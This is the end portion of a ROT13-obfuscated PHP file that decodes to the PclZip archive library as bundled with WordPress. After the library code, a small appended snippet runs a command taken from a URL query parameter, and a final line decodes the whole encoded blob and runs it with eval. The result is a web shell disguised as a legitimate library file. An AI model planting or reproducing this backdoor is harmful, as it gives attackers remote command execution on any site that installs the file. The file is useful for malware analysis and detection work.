
                // ----- Erghea
                erghea $i_erfhyg;
            }
        }

        // ----- Fgber gur bssfrg bs gur prageny qve
        $i_bssfrg = @sgryy($i_grzc_mvc->mvc_sq);

        // ----- Er-Perngr gur Prageny Qve svyrf urnqre
        sbe ($v=0; $v<fvmrbs($i_urnqre_yvfg); $v++) {
            // ----- Perngr gur svyr urnqre
            vs (($i_erfhyg = $i_grzc_mvc->ceviJevgrPragenySvyrUrnqre($i_urnqre_yvfg[$v])) != 1) {
                $i_grzc_mvc->ceviPybfrSq();
                $guvf->ceviPybfrSq();
                @hayvax($i_mvc_grzc_anzr);

                // ----- Erghea
                erghea $i_erfhyg;
            }

            // ----- Genafsbez gur urnqre gb n 'hfnoyr' vasb
            $i_grzc_mvc->ceviPbairegUrnqre2SvyrVasb($i_urnqre_yvfg[$v], $c_erfhyg_yvfg[$v]);
        }


        // ----- Mvc svyr pbzzrag
        $i_pbzzrag = '';
        vs (vffrg($c_bcgvbaf[CPYMVC_BCG_PBZZRAG])) {
          $i_pbzzrag = $c_bcgvbaf[CPYMVC_BCG_PBZZRAG];
        }

        // ----- Pnyphyngr gur fvmr bs gur prageny urnqre
        $i_fvmr = @sgryy($i_grzc_mvc->mvc_sq)-$i_bssfrg;

        // ----- Perngr gur prageny qve sbbgre
        vs (($i_erfhyg = $i_grzc_mvc->ceviJevgrPragenyUrnqre(fvmrbs($i_urnqre_yvfg), $i_fvmr, $i_bssfrg, $i_pbzzrag)) != 1) {
            // ----- Erfrg gur svyr yvfg
            hafrg($i_urnqre_yvfg);
            $i_grzc_mvc->ceviPybfrSq();
            $guvf->ceviPybfrSq();
            @hayvax($i_mvc_grzc_anzr);

            // ----- Erghea
            erghea $i_erfhyg;
        }

        // ----- Pybfr
        $i_grzc_mvc->ceviPybfrSq();
        $guvf->ceviPybfrSq();

        // ----- Qryrgr gur mvc svyr
        // GOP : V fubhyq grfg gur erfhyg ...
        @hayvax($guvf->mvcanzr);

        // ----- Eranzr gur grzcbenel svyr
        // GOP : V fubhyq grfg gur erfhyg ...
        //@eranzr($i_mvc_grzc_anzr, $guvf->mvcanzr);
        CpyMvcHgvyEranzr($i_mvc_grzc_anzr, $guvf->mvcanzr);

        // ----- Qrfgebl gur grzcbenel nepuvir
        hafrg($i_grzc_mvc);
    }

    // ----- Erzbir rirel svyrf : erfrg gur svyr
    ryfr vs ($i_prageny_qve['ragevrf'] != 0) {
        $guvf->ceviPybfrSq();

        vs (($i_erfhyg = $guvf->ceviBcraSq('jo')) != 1) {
          erghea $i_erfhyg;
        }

        vs (($i_erfhyg = $guvf->ceviJevgrPragenyUrnqre(0, 0, 0, '')) != 1) {
          erghea $i_erfhyg;
        }

        $guvf->ceviPybfrSq();
    }

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviQvePurpx()
  // Qrfpevcgvba :
  //   Purpx vs n qverpgbel rkvfgf, vs abg vg perngrf vg naq nyy gur cneragf qverpgbel
  //   juvpu znl or hfrshy.
  // Cnenzrgref :
  //   $c_qve : Qverpgbel cngu gb purpx.
  // Erghea Inyhrf :
  //    1 : BX
  //   -1 : Hanoyr gb perngr qverpgbel
  // --------------------------------------------------------------------------------
  shapgvba ceviQvePurpx($c_qve, $c_vf_qve=snyfr)
  {
    $i_erfhyg = 1;


    // ----- Erzbir gur svany '/'
    vs (($c_vf_qve) && (fhofge($c_qve, -1)=='/'))
    {
      $c_qve = fhofge($c_qve, 0, fgeyra($c_qve)-1);
    }

    // ----- Purpx gur qverpgbel ninvynovyvgl
    vs ((vf_qve($c_qve)) || ($c_qve == \"\"))
    {
      erghea 1;
    }

    // ----- Rkgenpg cnerag qverpgbel
    $c_cnerag_qve = qveanzr($c_qve);

    // ----- Whfg n purpx
    vs ($c_cnerag_qve != $c_qve)
    {
      // ----- Ybbx sbe cnerag qverpgbel
      vs ($c_cnerag_qve != \"\")
      {
        vs (($i_erfhyg = $guvf->ceviQvePurpx($c_cnerag_qve)) != 1)
        {
          erghea $i_erfhyg;
        }
      }
    }

    // ----- Perngr gur qverpgbel
    vs (!@zxqve($c_qve, 0777))
    {
      // ----- Reebe ybt
      CpyMvc::ceviReebeYbt(CPYMVC_REE_QVE_PERNGR_SNVY, \"Hanoyr gb perngr qverpgbel '$c_qve'\");

      // ----- Erghea
      erghea CpyMvc::reebePbqr();
    }

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviZretr()
  // Qrfpevcgvba :
  //   Vs $c_nepuvir_gb_nqq qbrf abg rkvfg, gur shapgvba rkvg jvgu n fhpprff erfhyg.
  // Cnenzrgref :
  // Erghea Inyhrf :
  // --------------------------------------------------------------------------------
  shapgvba ceviZretr(&$c_nepuvir_gb_nqq)
  {
    $i_erfhyg=1;

    // ----- Ybbx vs gur nepuvir_gb_nqq rkvfgf
    vs (!vf_svyr($c_nepuvir_gb_nqq->mvcanzr))
    {

      // ----- Abguvat gb zretr, fb zretr vf n fhpprff
      $i_erfhyg = 1;

      // ----- Erghea
      erghea $i_erfhyg;
    }

    // ----- Ybbx vs gur nepuvir rkvfgf
    vs (!vf_svyr($guvf->mvcanzr))
    {

      // ----- Qb n qhcyvpngr
      $i_erfhyg = $guvf->ceviQhcyvpngr($c_nepuvir_gb_nqq->mvcanzr);

      // ----- Erghea
      erghea $i_erfhyg;
    }

    // ----- Bcra gur mvc svyr
    vs (($i_erfhyg=$guvf->ceviBcraSq('eo')) != 1)
    {
      // ----- Erghea
      erghea $i_erfhyg;
    }

    // ----- Ernq gur prageny qverpgbel vasbezngvba
    $i_prageny_qve = neenl();
    vs (($i_erfhyg = $guvf->ceviErnqRaqPragenyQve($i_prageny_qve)) != 1)
    {
      $guvf->ceviPybfrSq();
      erghea $i_erfhyg;
    }

    // ----- Tb gb ortvaavat bs Svyr
    @erjvaq($guvf->mvc_sq);

    // ----- Bcra gur nepuvir_gb_nqq svyr
    vs (($i_erfhyg=$c_nepuvir_gb_nqq->ceviBcraSq('eo')) != 1)
    {
      $guvf->ceviPybfrSq();

      // ----- Erghea
      erghea $i_erfhyg;
    }

    // ----- Ernq gur prageny qverpgbel vasbezngvba
    $i_prageny_qve_gb_nqq = neenl();
    vs (($i_erfhyg = $c_nepuvir_gb_nqq->ceviErnqRaqPragenyQve($i_prageny_qve_gb_nqq)) != 1)
    {
      $guvf->ceviPybfrSq();
      $c_nepuvir_gb_nqq->ceviPybfrSq();

      erghea $i_erfhyg;
    }

    // ----- Tb gb ortvaavat bs Svyr
    @erjvaq($c_nepuvir_gb_nqq->mvc_sq);

    // ----- Perngrf n grzcbenel svyr
    $i_mvc_grzc_anzr = CPYMVC_GRZCBENEL_QVE.havdvq('cpymvc-').'.gzc';

    // ----- Bcra gur grzcbenel svyr va jevgr zbqr
    vs (($i_mvc_grzc_sq = @sbcra($i_mvc_grzc_anzr, 'jo')) == 0)
    {
      $guvf->ceviPybfrSq();
      $c_nepuvir_gb_nqq->ceviPybfrSq();

      CpyMvc::ceviReebeYbt(CPYMVC_REE_ERNQ_BCRA_SNVY, 'Hanoyr gb bcra grzcbenel svyr \''.$i_mvc_grzc_anzr.'\' va ovanel jevgr zbqr');

      // ----- Erghea
      erghea CpyMvc::reebePbqr();
    }

    // ----- Pbcl gur svyrf sebz gur nepuvir gb gur grzcbenel svyr
    // GOP : Urer V fubhyq orggre nccraq gur svyr naq tb onpx gb renfr gur prageny qve
    $i_fvmr = $i_prageny_qve['bssfrg'];
    juvyr ($i_fvmr != 0)
    {
      $i_ernq_fvmr = ($i_fvmr < CPYMVC_ERNQ_OYBPX_FVMR ? $i_fvmr : CPYMVC_ERNQ_OYBPX_FVMR);
      $i_ohssre = sernq($guvf->mvc_sq, $i_ernq_fvmr);
      @sjevgr($i_mvc_grzc_sq, $i_ohssre, $i_ernq_fvmr);
      $i_fvmr -= $i_ernq_fvmr;
    }

    // ----- Pbcl gur svyrf sebz gur nepuvir_gb_nqq vagb gur grzcbenel svyr
    $i_fvmr = $i_prageny_qve_gb_nqq['bssfrg'];
    juvyr ($i_fvmr != 0)
    {
      $i_ernq_fvmr = ($i_fvmr < CPYMVC_ERNQ_OYBPX_FVMR ? $i_fvmr : CPYMVC_ERNQ_OYBPX_FVMR);
      $i_ohssre = sernq($c_nepuvir_gb_nqq->mvc_sq, $i_ernq_fvmr);
      @sjevgr($i_mvc_grzc_sq, $i_ohssre, $i_ernq_fvmr);
      $i_fvmr -= $i_ernq_fvmr;
    }

    // ----- Fgber gur bssfrg bs gur prageny qve
    $i_bssfrg = @sgryy($i_mvc_grzc_sq);

    // ----- Pbcl gur oybpx bs svyr urnqref sebz gur byq nepuvir
    $i_fvmr = $i_prageny_qve['fvmr'];
    juvyr ($i_fvmr != 0)
    {
      $i_ernq_fvmr = ($i_fvmr < CPYMVC_ERNQ_OYBPX_FVMR ? $i_fvmr : CPYMVC_ERNQ_OYBPX_FVMR);
      $i_ohssre = @sernq($guvf->mvc_sq, $i_ernq_fvmr);
      @sjevgr($i_mvc_grzc_sq, $i_ohssre, $i_ernq_fvmr);
      $i_fvmr -= $i_ernq_fvmr;
    }

    // ----- Pbcl gur oybpx bs svyr urnqref sebz gur nepuvir_gb_nqq
    $i_fvmr = $i_prageny_qve_gb_nqq['fvmr'];
    juvyr ($i_fvmr != 0)
    {
      $i_ernq_fvmr = ($i_fvmr < CPYMVC_ERNQ_OYBPX_FVMR ? $i_fvmr : CPYMVC_ERNQ_OYBPX_FVMR);
      $i_ohssre = @sernq($c_nepuvir_gb_nqq->mvc_sq, $i_ernq_fvmr);
      @sjevgr($i_mvc_grzc_sq, $i_ohssre, $i_ernq_fvmr);
      $i_fvmr -= $i_ernq_fvmr;
    }

    // ----- Zretr gur svyr pbzzragf
    $i_pbzzrag = $i_prageny_qve['pbzzrag'].' '.$i_prageny_qve_gb_nqq['pbzzrag'];

    // ----- Pnyphyngr gur fvmr bs gur (arj) prageny urnqre
    $i_fvmr = @sgryy($i_mvc_grzc_sq)-$i_bssfrg;

    // ----- Fjnc gur svyr qrfpevcgbe
    // Urer vf n gevpx : V fjnc gur grzcbenel sq jvgu gur mvc sq, va beqre gb hfr
    // gur sbyybjvat zrgubqf ba gur grzcbenel svy naq abg gur erny nepuvir sq
    $i_fjnc = $guvf->mvc_sq;
    $guvf->mvc_sq = $i_mvc_grzc_sq;
    $i_mvc_grzc_sq = $i_fjnc;

    // ----- Perngr gur prageny qve sbbgre
    vs (($i_erfhyg = $guvf->ceviJevgrPragenyUrnqre($i_prageny_qve['ragevrf']+$i_prageny_qve_gb_nqq['ragevrf'], $i_fvmr, $i_bssfrg, $i_pbzzrag)) != 1)
    {
      $guvf->ceviPybfrSq();
      $c_nepuvir_gb_nqq->ceviPybfrSq();
      @spybfr($i_mvc_grzc_sq);
      $guvf->mvc_sq = ahyy;

      // ----- Erfrg gur svyr yvfg
      hafrg($i_urnqre_yvfg);

      // ----- Erghea
      erghea $i_erfhyg;
    }

    // ----- Fjnc onpx gur svyr qrfpevcgbe
    $i_fjnc = $guvf->mvc_sq;
    $guvf->mvc_sq = $i_mvc_grzc_sq;
    $i_mvc_grzc_sq = $i_fjnc;

    // ----- Pybfr
    $guvf->ceviPybfrSq();
    $c_nepuvir_gb_nqq->ceviPybfrSq();

    // ----- Pybfr gur grzcbenel svyr
    @spybfr($i_mvc_grzc_sq);

    // ----- Qryrgr gur mvc svyr
    // GOP : V fubhyq grfg gur erfhyg ...
    @hayvax($guvf->mvcanzr);

    // ----- Eranzr gur grzcbenel svyr
    // GOP : V fubhyq grfg gur erfhyg ...
    //@eranzr($i_mvc_grzc_anzr, $guvf->mvcanzr);
    CpyMvcHgvyEranzr($i_mvc_grzc_anzr, $guvf->mvcanzr);

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviQhcyvpngr()
  // Qrfpevcgvba :
  // Cnenzrgref :
  // Erghea Inyhrf :
  // --------------------------------------------------------------------------------
  shapgvba ceviQhcyvpngr($c_nepuvir_svyranzr)
  {
    $i_erfhyg=1;

    // ----- Ybbx vs gur $c_nepuvir_svyranzr rkvfgf
    vs (!vf_svyr($c_nepuvir_svyranzr))
    {

      // ----- Abguvat gb qhcyvpngr, fb qhcyvpngr vf n fhpprff.
      $i_erfhyg = 1;

      // ----- Erghea
      erghea $i_erfhyg;
    }

    // ----- Bcra gur mvc svyr
    vs (($i_erfhyg=$guvf->ceviBcraSq('jo')) != 1)
    {
      // ----- Erghea
      erghea $i_erfhyg;
    }

    // ----- Bcra gur grzcbenel svyr va jevgr zbqr
    vs (($i_mvc_grzc_sq = @sbcra($c_nepuvir_svyranzr, 'eo')) == 0)
    {
      $guvf->ceviPybfrSq();

      CpyMvc::ceviReebeYbt(CPYMVC_REE_ERNQ_BCRA_SNVY, 'Hanoyr gb bcra nepuvir svyr \''.$c_nepuvir_svyranzr.'\' va ovanel jevgr zbqr');

      // ----- Erghea
      erghea CpyMvc::reebePbqr();
    }

    // ----- Pbcl gur svyrf sebz gur nepuvir gb gur grzcbenel svyr
    // GOP : Urer V fubhyq orggre nccraq gur svyr naq tb onpx gb renfr gur prageny qve
    $i_fvmr = svyrfvmr($c_nepuvir_svyranzr);
    juvyr ($i_fvmr != 0)
    {
      $i_ernq_fvmr = ($i_fvmr < CPYMVC_ERNQ_OYBPX_FVMR ? $i_fvmr : CPYMVC_ERNQ_OYBPX_FVMR);
      $i_ohssre = sernq($i_mvc_grzc_sq, $i_ernq_fvmr);
      @sjevgr($guvf->mvc_sq, $i_ohssre, $i_ernq_fvmr);
      $i_fvmr -= $i_ernq_fvmr;
    }

    // ----- Pybfr
    $guvf->ceviPybfrSq();

    // ----- Pybfr gur grzcbenel svyr
    @spybfr($i_mvc_grzc_sq);

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviReebeYbt()
  // Qrfpevcgvba :
  // Cnenzrgref :
  // --------------------------------------------------------------------------------
  shapgvba ceviReebeYbt($c_reebe_pbqr=0, $c_reebe_fgevat='')
  {
    vs (CPYMVC_REEBE_RKGREANY == 1) {
      CpyReebe($c_reebe_pbqr, $c_reebe_fgevat);
    }
    ryfr {
      $guvf->reebe_pbqr = $c_reebe_pbqr;
      $guvf->reebe_fgevat = $c_reebe_fgevat;
    }
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviReebeErfrg()
  // Qrfpevcgvba :
  // Cnenzrgref :
  // --------------------------------------------------------------------------------
  shapgvba ceviReebeErfrg()
  {
    vs (CPYMVC_REEBE_RKGREANY == 1) {
      CpyReebeErfrg();
    }
    ryfr {
      $guvf->reebe_pbqr = 0;
      $guvf->reebe_fgevat = '';
    }
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviQvfnoyrZntvpDhbgrf()
  // Qrfpevcgvba :
  // Cnenzrgref :
  // Erghea Inyhrf :
  // --------------------------------------------------------------------------------
  shapgvba ceviQvfnoyrZntvpDhbgrf()
  {
    $i_erfhyg=1;

	// RQVG sbe JbeqCerff 5.3.0
	// zntvp_dhbgr shapgvbaf ner qrcerpngrq va CUC 7.4, abj nffhzvat vg'f nyjnlf bss.
	/*

    // ----- Ybbx vs shapgvba rkvfgf
    vs (   (!shapgvba_rkvfgf(\"trg_zntvp_dhbgrf_ehagvzr\"))
	    || (!shapgvba_rkvfgf(\"frg_zntvp_dhbgrf_ehagvzr\"))) {
      erghea $i_erfhyg;
	}

    // ----- Ybbx vs nyernql qbar
    vs ($guvf->zntvp_dhbgrf_fgnghf != -1) {
      erghea $i_erfhyg;
	}

	// ----- Trg naq zrzbevmr gur zntvp_dhbgr inyhr
	$guvf->zntvp_dhbgrf_fgnghf = @trg_zntvp_dhbgrf_ehagvzr();

	// ----- Qvfnoyr zntvp_dhbgrf
	vs ($guvf->zntvp_dhbgrf_fgnghf == 1) {
	  @frg_zntvp_dhbgrf_ehagvzr(0);
	}
	*/

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : ceviFjncOnpxZntvpDhbgrf()
  // Qrfpevcgvba :
  // Cnenzrgref :
  // Erghea Inyhrf :
  // --------------------------------------------------------------------------------
  shapgvba ceviFjncOnpxZntvpDhbgrf()
  {
    $i_erfhyg=1;

	// RQVG sbe JbeqCerff 5.3.0
	// zntvp_dhbgr shapgvbaf ner qrcerpngrq va CUC 7.4, abj nffhzvat vg'f nyjnlf bss.
	/*

    // ----- Ybbx vs shapgvba rkvfgf
    vs (   (!shapgvba_rkvfgf(\"trg_zntvp_dhbgrf_ehagvzr\"))
	    || (!shapgvba_rkvfgf(\"frg_zntvp_dhbgrf_ehagvzr\"))) {
      erghea $i_erfhyg;
	}

    // ----- Ybbx vs fbzrguvat gb qb
    vs ($guvf->zntvp_dhbgrf_fgnghf != -1) {
      erghea $i_erfhyg;
	}

	// ----- Fjnc onpx zntvp_dhbgrf
	vs ($guvf->zntvp_dhbgrf_fgnghf == 1) {
  	  @frg_zntvp_dhbgrf_ehagvzr($guvf->zntvp_dhbgrf_fgnghf);
	}

	*/
    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  }
  // Raq bs pynff
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : CpyMvcHgvyCnguErqhpgvba()
  // Qrfpevcgvba :
  // Cnenzrgref :
  // Erghea Inyhrf :
  // --------------------------------------------------------------------------------
  shapgvba CpyMvcHgvyCnguErqhpgvba($c_qve)
  {
    $i_erfhyg = \"\";

    // ----- Ybbx sbe abg rzcgl cngu
    vs ($c_qve != \"\") {
      // ----- Rkcybqr cngu ol qverpgbel anzrf
      $i_yvfg = rkcybqr(\"/\", $c_qve);

      // ----- Fghql qverpgbevrf sebz ynfg gb svefg
      $i_fxvc = 0;
      sbe ($v=fvmrbs($i_yvfg)-1; $v>=0; $v--) {
        // ----- Ybbx sbe pheerag cngu
        vs ($i_yvfg[$v] == \".\") {
          // ----- Vtaber guvf qverpgbel
          // Fubhyq or gur svefg $v=0, ohg ab purpx vf qbar
        }
        ryfr vs ($i_yvfg[$v] == \"..\") {
		  $i_fxvc++;
        }
        ryfr vs ($i_yvfg[$v] == \"\") {
		  // ----- Svefg '/' v.r. ebbg fynfu
		  vs ($v == 0) {
            $i_erfhyg = \"/\".$i_erfhyg;
		    vs ($i_fxvc > 0) {
		        // ----- Vg vf na vainyvq cngu, fb gur cngu vf abg zbqvsvrq
		        // GOP
		        $i_erfhyg = $c_qve;
                $i_fxvc = 0;
		    }
		  }
		  // ----- Ynfg '/' v.r. vaqvpngrf n qverpgbel
		  ryfr vs ($v == (fvmrbs($i_yvfg)-1)) {
            $i_erfhyg = $i_yvfg[$v];
		  }
		  // ----- Qbhoyr '/' vafvqr gur cngu
		  ryfr {
            // ----- Vtaber bayl gur qbhoyr '//' va cngu,
            // ohg abg gur svefg naq ynfg '/'
		  }
        }
        ryfr {
		  // ----- Ybbx sbe vgrz gb fxvc
		  vs ($i_fxvc > 0) {
		    $i_fxvc--;
		  }
		  ryfr {
            $i_erfhyg = $i_yvfg[$v].($v!=(fvmrbs($i_yvfg)-1)?\"/\".$i_erfhyg:\"\");
		  }
        }
      }

      // ----- Ybbx sbe fxvc
      vs ($i_fxvc > 0) {
        juvyr ($i_fxvc > 0) {
            $i_erfhyg = '../'.$i_erfhyg;
            $i_fxvc--;
        }
      }
    }

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : CpyMvcHgvyCnguVapyhfvba()
  // Qrfpevcgvba :
  //   Guvf shapgvba vaqvpngrf vs gur cngu $c_cngu vf haqre gur $c_qve gerr. Be,
  //   fnvq va na bgure jnl, vs gur svyr be fho-qve $c_cngu vf vafvqr gur qve
  //   $c_qve.
  //   Gur shapgvba vaqvpngrf nyfb vs gur cngu vf rknpgyl gur fnzr nf gur qve.
  //   Guvf shapgvba fhccbegf cngu jvgu qhcyvpngrq '/' yvxr '//', ohg qbrf abg
  //   fhccbeg '.' be '..' fgngrzragf.
  // Cnenzrgref :
  // Erghea Inyhrf :
  //   0 vs $c_cngu vf abg vafvqr qverpgbel $c_qve
  //   1 vs $c_cngu vf vafvqr qverpgbel $c_qve
  //   2 vs $c_cngu vf rknpgyl gur fnzr nf $c_qve
  // --------------------------------------------------------------------------------
  shapgvba CpyMvcHgvyCnguVapyhfvba($c_qve, $c_cngu)
  {
    $i_erfhyg = 1;

    // ----- Ybbx sbe cngu ortvaavat ol ./
    vs (   ($c_qve == '.')
        || ((fgeyra($c_qve) >=2) && (fhofge($c_qve, 0, 2) == './'))) {
      $c_qve = CpyMvcHgvyGenafyngrJvaCngu(trgpjq(), SNYFR).'/'.fhofge($c_qve, 1);
    }
    vs (   ($c_cngu == '.')
        || ((fgeyra($c_cngu) >=2) && (fhofge($c_cngu, 0, 2) == './'))) {
      $c_cngu = CpyMvcHgvyGenafyngrJvaCngu(trgpjq(), SNYFR).'/'.fhofge($c_cngu, 1);
    }

    // ----- Rkcybqr qve naq cngu ol qverpgbel frcnengbe
    $i_yvfg_qve = rkcybqr(\"/\", $c_qve);
    $i_yvfg_qve_fvmr = fvmrbs($i_yvfg_qve);
    $i_yvfg_cngu = rkcybqr(\"/\", $c_cngu);
    $i_yvfg_cngu_fvmr = fvmrbs($i_yvfg_cngu);

    // ----- Fghql qverpgbevrf cnguf
    $v = 0;
    $w = 0;
    juvyr (($v < $i_yvfg_qve_fvmr) && ($w < $i_yvfg_cngu_fvmr) && ($i_erfhyg)) {

      // ----- Ybbx sbe rzcgl qve (cngu erqhpgvba)
      vs ($i_yvfg_qve[$v] == '') {
        $v++;
        pbagvahr;
      }
      vs ($i_yvfg_cngu[$w] == '') {
        $w++;
        pbagvahr;
      }

      // ----- Pbzcner gur vgrzf
      vs (($i_yvfg_qve[$v] != $i_yvfg_cngu[$w]) && ($i_yvfg_qve[$v] != '') && ( $i_yvfg_cngu[$w] != ''))  {
        $i_erfhyg = 0;
      }

      // ----- Arkg vgrzf
      $v++;
      $w++;
    }

    // ----- Ybbx vs rirelguvat frrzf gb or gur fnzr
    vs ($i_erfhyg) {
      // ----- Fxvc nyy gur rzcgl vgrzf
      juvyr (($w < $i_yvfg_cngu_fvmr) && ($i_yvfg_cngu[$w] == '')) $w++;
      juvyr (($v < $i_yvfg_qve_fvmr) && ($i_yvfg_qve[$v] == '')) $v++;

      vs (($v >= $i_yvfg_qve_fvmr) && ($w >= $i_yvfg_cngu_fvmr)) {
        // ----- Gurer ner rknpgyl gur fnzr
        $i_erfhyg = 2;
      }
      ryfr vs ($v < $i_yvfg_qve_fvmr) {
        // ----- Gur cngu vf fubegre guna gur qve
        $i_erfhyg = 0;
      }
    }

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : CpyMvcHgvyPbclOybpx()
  // Qrfpevcgvba :
  // Cnenzrgref :
  //   $c_zbqr : ernq/jevgr pbzcerffvba zbqr
  //             0 : fep & qrfg abezny
  //             1 : fep tmvc, qrfg abezny
  //             2 : fep abezny, qrfg tmvc
  //             3 : fep & qrfg tmvc
  // Erghea Inyhrf :
  // --------------------------------------------------------------------------------
  shapgvba CpyMvcHgvyPbclOybpx($c_fep, $c_qrfg, $c_fvmr, $c_zbqr=0)
  {
    $i_erfhyg = 1;

    vs ($c_zbqr==0)
    {
      juvyr ($c_fvmr != 0)
      {
        $i_ernq_fvmr = ($c_fvmr < CPYMVC_ERNQ_OYBPX_FVMR ? $c_fvmr : CPYMVC_ERNQ_OYBPX_FVMR);
        $i_ohssre = @sernq($c_fep, $i_ernq_fvmr);
        @sjevgr($c_qrfg, $i_ohssre, $i_ernq_fvmr);
        $c_fvmr -= $i_ernq_fvmr;
      }
    }
    ryfr vs ($c_zbqr==1)
    {
      juvyr ($c_fvmr != 0)
      {
        $i_ernq_fvmr = ($c_fvmr < CPYMVC_ERNQ_OYBPX_FVMR ? $c_fvmr : CPYMVC_ERNQ_OYBPX_FVMR);
        $i_ohssre = @tmernq($c_fep, $i_ernq_fvmr);
        @sjevgr($c_qrfg, $i_ohssre, $i_ernq_fvmr);
        $c_fvmr -= $i_ernq_fvmr;
      }
    }
    ryfr vs ($c_zbqr==2)
    {
      juvyr ($c_fvmr != 0)
      {
        $i_ernq_fvmr = ($c_fvmr < CPYMVC_ERNQ_OYBPX_FVMR ? $c_fvmr : CPYMVC_ERNQ_OYBPX_FVMR);
        $i_ohssre = @sernq($c_fep, $i_ernq_fvmr);
        @tmjevgr($c_qrfg, $i_ohssre, $i_ernq_fvmr);
        $c_fvmr -= $i_ernq_fvmr;
      }
    }
    ryfr vs ($c_zbqr==3)
    {
      juvyr ($c_fvmr != 0)
      {
        $i_ernq_fvmr = ($c_fvmr < CPYMVC_ERNQ_OYBPX_FVMR ? $c_fvmr : CPYMVC_ERNQ_OYBPX_FVMR);
        $i_ohssre = @tmernq($c_fep, $i_ernq_fvmr);
        @tmjevgr($c_qrfg, $i_ohssre, $i_ernq_fvmr);
        $c_fvmr -= $i_ernq_fvmr;
      }
    }

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : CpyMvcHgvyEranzr()
  // Qrfpevcgvba :
  //   Guvf shapgvba gevrf gb qb n fvzcyr eranzr() shapgvba. Vs vg snvyf, vg
  //   gevrf gb pbcl gur $c_fep svyr va n arj $c_qrfg svyr naq gura hayvax gur
  //   svefg bar.
  // Cnenzrgref :
  //   $c_fep : Byq svyranzr
  //   $c_qrfg : Arj svyranzr
  // Erghea Inyhrf :
  //   1 ba fhpprff, 0 ba snvyher.
  // --------------------------------------------------------------------------------
  shapgvba CpyMvcHgvyEranzr($c_fep, $c_qrfg)
  {
    $i_erfhyg = 1;

    // ----- Gel gb eranzr gur svyrf
    vs (!@eranzr($c_fep, $c_qrfg)) {

      // ----- Gel gb pbcl & hayvax gur fep
      vs (!@pbcl($c_fep, $c_qrfg)) {
        $i_erfhyg = 0;
      }
      ryfr vs (!@hayvax($c_fep)) {
        $i_erfhyg = 0;
      }
    }

    // ----- Erghea
    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : CpyMvcHgvyBcgvbaGrkg()
  // Qrfpevcgvba :
  //   Genafyngr bcgvba inyhr va grkg. Znvayl sbe qroht checbfr.
  // Cnenzrgref :
  //   $c_bcgvba : gur bcgvba inyhr.
  // Erghea Inyhrf :
  //   Gur bcgvba grkg inyhr.
  // --------------------------------------------------------------------------------
  shapgvba CpyMvcHgvyBcgvbaGrkg($c_bcgvba)
  {

    $i_yvfg = trg_qrsvarq_pbafgnagf();
    sbe (erfrg($i_yvfg); $i_xrl = xrl($i_yvfg); arkg($i_yvfg)) {
	    $i_cersvk = fhofge($i_xrl, 0, 10);
	    vs ((   ($i_cersvk == 'CPYMVC_BCG')
           || ($i_cersvk == 'CPYMVC_PO_')
           || ($i_cersvk == 'CPYMVC_NGG'))
	        && ($i_yvfg[$i_xrl] == $c_bcgvba)) {
        erghea $i_xrl;
	    }
    }

    $i_erfhyg = 'Haxabja';

    erghea $i_erfhyg;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Shapgvba : CpyMvcHgvyGenafyngrJvaCngu()
  // Qrfpevcgvba :
  //   Genafyngr jvaqbjf cngu ol ercynpvat '\' ol '/' naq bcgvbanyyl erzbivat
  //   qevir yrggre.
  // Cnenzrgref :
  //   $c_cngu : cngu gb genafyngr.
  //   $c_erzbir_qvfx_yrggre : gehr | snyfr
  // Erghea Inyhrf :
  //   Gur cngu genafyngrq.
  // --------------------------------------------------------------------------------
  shapgvba CpyMvcHgvyGenafyngrJvaCngu($c_cngu, $c_erzbir_qvfx_yrggre=gehr)
  {
    vs (CUC_BF_SNZVYL == 'Jvaqbjf') {
      // ----- Ybbx sbe cbgragvny qvfx yrggre
      vs (($c_erzbir_qvfx_yrggre) && (($i_cbfvgvba = fgecbf($c_cngu, ':')) != snyfr)) {
          $c_cngu = fhofge($c_cngu, $i_cbfvgvba+1);
      }
      // ----- Punatr cbgragvny jvaqbjf qverpgbel frcnengbe
      vs ((fgecbf($c_cngu, '\\') > 0) || (fhofge($c_cngu, 0,1) == '\\')) {
          $c_cngu = fgege($c_cngu, '\\', '/');
      }
    }
    erghea $c_cngu;
  }
  // --------------------------------------------------------------------------------


?>

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>